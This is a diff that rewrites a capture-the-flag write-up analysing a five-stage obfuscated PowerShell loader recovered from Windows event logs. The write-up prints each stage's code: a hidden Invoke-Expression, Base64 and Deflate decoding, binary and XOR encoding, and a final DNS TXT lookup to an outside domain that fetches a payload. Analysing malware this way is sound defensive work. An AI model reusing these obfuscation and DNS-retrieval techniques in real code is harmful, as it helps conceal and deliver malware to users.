@@ -1,37 +1,201 @@
-I have 5 classic .evtx files at this challenge. (Application, Operational, Security, Setup, System)
-Opening them with Event Viewer on Windows I saw on the Operational a suspect powershell command from an user.
-Putting it in VsCode we can see it better.
+# 📝 Malware Analysis Write-Up — Multi-Stage PowerShell Loader
 
-So this was the file:
+## 📂 Overview
 
-.( $VErboSEPREfErenCe.toSTRING()[1,3]+'x'-jOIN'') (NeW-OBjeCT  io.sTrEAMREaDeR((NeW-OBjeCT SYsTEM.io.cOmpRessIOn.dEfLaTeSTreAM( [SysTem.io.mEmoRYStrEam] [sySteM.conveRt]::fROmbaSe64sTriNg( '7V1Niy
-7ennXz/939f/+PUvf/NP' ) , [sYstEM.iO.coMpRESsIon.cOmPrESsIoNmodE]::dEcOMpresS )) ,[SYsTEM.TeXt.EnCODiNG]::asciI) ).rEadtOEND( ) 
+In this challenge we were given **five Windows Event Log (.evtx)** files:
 
-We can extract from it: $VErboSEPREfErenCe is a variable that have the value of SilentlyContinue and we can get the 1 & 3 character => 'ie' + 'x' = 'iex'.
-That makes a powershell promt an executable, it stands for 'Invoke-Expression'.
-The rest of the code suggest us that is a string in base64 using DeflateStream for compresing data. 
+* Application
+* Operational
+* Security
+* Setup
+* System
 
-This is the stage 1. If we delete de 'iex' thing, we can execute the file .ps1 in powershell for stage 2.
+While inspecting the **Operational** log in Event Viewer, a suspicious PowerShell command executed by a user immediately stood out. After extracting the command and formatting it in VS Code, the structure of the malware became clear.
 
+---
 
--join ($("00100110 00100000 00101000 00100000 00100100 01010011 01101000 
--split ' ') | ForEach-Object { [char][Convert]::ToInt32($_, 2) })|IEX
+# 🔥 Stage 1 — Initial Loader (Base64 + Deflate + Hidden IEX)
 
-Here is a string binary data that is converted in [char] and executed. Again we delete the IEX for safely.
+The malicious command:
 
-Now the stage 3:
-& ( $SheLLiD[1]+$ShELlID[13]+'X') ( [STrIng]::JOIn( '' , ( (116, 116 ,39 , 17,1, 89,94 )| % {[CHaR] ( $_-BXor '0x54') }) )) 
+```powershell
+.( $VErboSEPREfErenCe.toSTRING()[1,3]+'x'-jOIN'') (
+    NeW-OBjeCT io.sTrEAMREaDeR(
+        (NeW-OBjeCT SYsTEM.io.cOmpRessIOn.dEfLaTeSTreAM(
+            [SysTem.io.mEmoRYStrEaM] [sySteM.conveRt]::fROmbaSe64sTriNg(
+                '7V1NiyTJ ... 7ennXz/939f/+PUvf/NP'
+            ),
+            [sYstEM.iO.coMpRESsIon.cOmPrESsIoNmodE]::dEcOMpresS
+        )),
+        [SYsTEM.TeXt.EnCODiNG]::asciI
+    )
+).rEadtOEND()
+```
 
- Here again we have the IEX from & ( $SheLLiD[1]+$ShELlID[13]+'X') and we can see that the data is using XOR this time for encoding. 
+### ✔ What happens here
 
- Stage 4:
-  sET-ITeM  ('VARiABl'+'E:rC'+'w')  (  [TypE]("{0}{1}"-f'sT','ring')) ;  ("{120}{83}{22}{31}{10}{42}{21}{93}{95}{40}{9}{37}{30}{68}{27}{57}{121}{128}{110}{116}     		  	  	 ','    		 ','   		  	 	  		  	 	         ','   	   		 ','   ') |&('%') {${rOiqxj`pG} = ${_} -cSPlit '		' | &('%') {'	'; ${_} -cSPlit '	' |&('%') { ${_}."lEN`GTh"-1} };  (  iTEm  ('vArI'+'A'+'BLE:'+'rcW')  )."VaL`UE"::("{1}{0}"-f'in','jo').Invoke( '' , ( (  (GEt-cHILdITem  ('vaRiaBl'+'e:rC'+'w')  )."vA`LuE"::"J`oIN"('',${R`OIq`XJPg}[0..(${R`oI`QxJpg}."l`en`gTh"-1)]) ).("{1}{0}"-f'rIm','T').Invoke( '	 ' ).("{0}{1}" -f'sp','LIT').Invoke('	') | .('%'){([Int] ${_} -as[cHAR]) } ))|.("{0}{5}{1}{2}{3}{4}"-f'i','K','E-','eXpR','essION','nVO')}
+* `$VerbosePreference` normally contains the string: **SilentlyContinue**
+* Characters `[1,3]` are **"i"** and **"e"**
+* `"i" + "e" + "x"` = **iex**
 
+So the malware constructs `iex` (Invoke-Expression) without writing it explicitly.
 
-  We get lots of things here but if we are carrefuly we extract again the latest part which means IEX |.("{0}{5}{1}{2}{3}{4}"-f'i','K','E-','eXpR','essION','nVO')} and put it in ps.
+The rest:
 
-Stage 5:
-  # IEX [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((((((nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object)[3]) -replace '^[^"]*"|"$') + ('==','=','','=')[((((((nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object)[3]) -replace '^[^"]*"|"$').Length % 4))])))
+* Decodes Base64
+* Wraps bytes in a `MemoryStream`
+* Decompresses via **DeflateStream**
+* Reads the resulting script
 
+This yields **Stage 2**.
 
-Here is made a padding for Base64 and with nslookup, the script is sending DNS q at that server. We delete the   # IEX  & get the flag.
+### 🔐 Safety
+
+Remove the constructed `iex` call to decode safely.
+
+---
+
+# 🔥 Stage 2 — Binary-Encoded Script
+
+Decoded Stage 1 results in something like:
+
+```powershell
+-join ($("00100110 00100000 00101000 00100000 00100100 01010011 01101000"
+-split ' ') | ForEach-Object { [char][Convert]::ToInt32($_, 2) }) | IEX
+```
+
+### ✔ What this does
+
+* Contains hundreds of **8-bit binary values**
+* Splits them into an array
+* Converts each binary number → decimal → char
+* Joins all chars into a script
+* Executes it using `IEX`
+
+### 🔐 Safety
+
+Remove `| IEX` to inspect safely.
+
+---
+
+# 🔥 Stage 3 — XOR-Obfuscated Integers
+
+Decoded Stage 2 yields:
+
+```powershell
+& ( $SheLLiD[1]+$ShELlID[13]+'X') (
+    [STrIng]::JOIn('' , (
+        (116,116,39,17,1,89,94) |
+        % { [CHaR]($_ -BXor 0x54) }
+    ))
+)
+```
+
+### ✔ Meaning
+
+* `$ShellId[1] + $ShellId[13] + 'X'` → **iex**
+* The payload is encoded as integers
+* Decoded by: `character = integer XOR 0x54`
+
+This yields **Stage 4**.
+
+---
+
+# 🔥 Stage 4 — Heavy String Manipulation Obfuscation
+
+Stage 4 looks like:
+
+```powershell
+sET-ITeM('VARiABl'+'E:rC'+'w')([TypE]("{0}{1}"-f 'sT','ring'));
+("{120}{83}{22}{31}{10}{42}{21}{93}{95}{40}{9}{37}{30}{68} ... }
+| &('%') { ... }
+| .("{0}{5}{1}{2}{3}{4}"-f 'i','K','E-','eXpR','essION','nVO')
+```
+
+### ✔ What happens
+
+* A temporary variable is created (`variable:rcw`)
+* Thousands of characters are reassembled through:
+
+  * split
+  * join
+  * substring
+  * array slicing
+* Final line again resolves to **Invoke-Expression**, built via string formatting:
+
+```
+"{0}{5}{1}{2}{3}{4}" → i + nVO + K + E- + eXpR + ession = Invoke-Expression
+```
+
+### 🔐 Safety
+
+Remove that last obfuscated IEX.
+
+This yields **Stage 5**.
+
+---
+
+# 🔥 Stage 5 — DNS-Based C2 Retrieval
+
+Final stage:
+
+```powershell
+# IEX [System.Text.Encoding]::UTF8.GetString(
+[System.Convert]::FromBase64String(
+    (
+        (
+            (nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object
+        )[3] -replace '^[^"]*"|"$'
+    )
+    + ('==','=','','=')[((
+            (nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object
+        )[3] -replace '^[^"]*"|"$'
+    ).Length % 4]
+)))
+```
+
+### ✔ What this does
+
+* Performs a DNS TXT lookup to: **chronos-security.ro**
+* Extracts Base64 from the TXT record
+* Applies correct Base64 padding
+* Decodes the final payload
+
+This is a **DNS C2 mechanism**: malware retrieves payloads using DNS instead of HTTP.
+
+### 🔐 Final step
+
+Remove `IEX` and decode → the **flag** is revealed.
+
+---
+
+# 🏁 Summary
+
+The malware uses **five layers of obfuscation**:
+
+1. Obfuscated IEX + Base64 + Deflate decompression
+2. Binary → char reconstruction
+3. XOR-decoded integer array
+4. Extreme string-manipulation obfuscation
+5. DNS TXT extraction for final payload delivery
+
+At every step, the attacker attempts to hide:
+
+* Invocation of `iex`
+* Payload strings
+* Final network communication
+
+By manually removing the execution components and decoding each stage, the full chain can be reconstructed and the final payload/flag is recovered.
+
+---
+
+# ✔ Additional Assistance
+
+I can generate:
+
+* A PDF report
+* A diagram of the 5-stage execution chain
+* IOC list
+* Clean decoded versions of each stage
+
+Just let me know!
